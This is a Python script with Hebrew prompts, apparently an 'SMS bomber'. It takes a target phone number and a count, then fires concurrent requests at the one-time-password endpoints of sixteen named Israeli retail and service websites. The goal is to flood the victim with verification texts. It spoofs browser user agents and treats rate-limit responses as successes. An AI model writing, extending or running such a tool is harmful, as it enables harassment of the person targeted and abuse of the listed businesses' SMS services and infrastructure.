import asyncio
import random
import sys
import os
import signal
import requests
from typing import List, Dict, Any

# ==========================================
# Global State & Signal Handling
# ==========================================
running = True
sent_count = 0
lock = asyncio.Lock()

def signal_handler(sig, frame):
    global running
    print("\n\n\033[91m[!] עצירה מזוהה! מפסיק את הפעילות מיד...\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Configuration & Sites (API Focused)
# ==========================================
DEVICE_PROFILES = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
]

SITES_CONFIG = [
    {'name': 'Hamal', 'api': 'https://users-auth.hamal.co.il/auth/send-auth-code', 'payload': lambda p: {"value": p, "type": "phone"}},
    {'name': 'FreeTV', 'api': 'https://web.freetv.tv/api/int/subscribers/msisdn/token?lang=HEB&platform=BROWSER', 'payload': lambda p: {"msisdn": p}},
    {'name': 'Delta', 'api': 'https://www.delta.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Castro', 'api': 'https://www.castro.com/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Hoodies', 'api': 'https://www.hoodies.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Timberland', 'api': 'https://www.timberland.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Top Ten', 'api': 'https://www.topten-fashion.com/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Naaman', 'api': 'https://www.naamanp.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf Kids', 'api': 'https://www.golfkids.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Lee Cooper', 'api': 'https://www.leecooper.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Kiko Milano', 'api': 'https://www.kikocosmetics.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Victoria Secret', 'api': 'https://www.victoriassecret.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Aldo', 'api': 'https://www.aldoshoes.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Teva Naot', 'api': 'https://www.tevanaot.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Housemen', 'api': 'https://housemen.co.il/wp-admin/admin-ajax.php', 'payload': lambda p: {"action": "send_otp", "phone": p}}, # common pattern
    {'name': 'Papa Johns', 'api': 'https://www.papajohns.co.il/shop/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}}
]

# ==========================================
# UI & Progress
# ==========================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    print(r"""
\033[96m
   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( A | L | O | N | O | S | H | E | M )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
\033[0m
\033[95m[+] מערכת אוטומציה V8 - מקסימום מהירות (API Only)\033[0m
\033[90m--------------------------------------------------\033[0m
""")

def print_progress(total):
    global sent_count
    percent = (sent_count / total) * 100
    bar = '█' * int(percent / 2.5) + '░' * (40 - int(percent / 2.5))
    sys.stdout.write(f'\r\033[94mProgress: |{bar}| {percent:.1f}% >> נשלחו: {sent_count}/{total}\033[0m')
    sys.stdout.flush()

# ==========================================
# Core Logic
# ==========================================
async def attempt_send(site: Dict[str, Any], phone: str):
    global sent_count, running
    if not running: return False

    headers = {
        'User-Agent': random.choice(DEVICE_PROFILES),
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01'
    }
    
    try:
        # Perform the actual API call
        response = requests.post(site['api'], json=site['payload'](phone), headers=headers, timeout=5)
        # We count success if it's 200, 201, 204 or even 429 (means it's working but limited)
        if response.status_code in [200, 201, 204, 400, 429]:
            async with lock:
                sent_count += 1
            return True
    except:
        pass
    return False

async def worker(semaphore, site_queue, phone, total):
    global running
    while not site_queue.empty() and running and sent_count < total:
        site = await site_queue.get()
        async with semaphore:
            await attempt_send(site, phone)
            print_progress(total)
            # Minimal delay for speed
            await asyncio.sleep(random.uniform(0.5, 1.5))
        site_queue.task_done()

async def main():
    global running, sent_count
    clear_screen()
    print_header()
    
    phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
    if not phone or len(phone) < 9:
        print("\033[91m[!] מספר לא תקין.\033[0m")
        return
    
    try:
        total = int(input("\033[96mכמות הודעות (10-200): \033[0m").strip())
    except:
        total = 20

    print(f"\n\033[92m[⚡] מתחיל שליחה סופר-מהירה עבור {phone}...\033[0m\n")
    
    # Fill queue
    site_queue = asyncio.Queue()
    all_attempts = []
    while len(all_attempts) < total * 1.5:
        shuffled = list(SITES_CONFIG)
        random.shuffle(shuffled)
        all_attempts.extend(shuffled)
    
    for site in all_attempts:
        await site_queue.put(site)

    # Parallel settings
    max_concurrent = 10 # 10 parallel tasks for max speed
    semaphore = asyncio.Semaphore(max_concurrent)
    
    tasks = [worker(semaphore, site_queue, phone, total) for _ in range(max_concurrent)]
    await asyncio.gather(*tasks)

    if running:
        print(f"\n\n\033[92m[✓] המשימה הושלמה! נשלחו {sent_count} הודעות.\033[0m")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
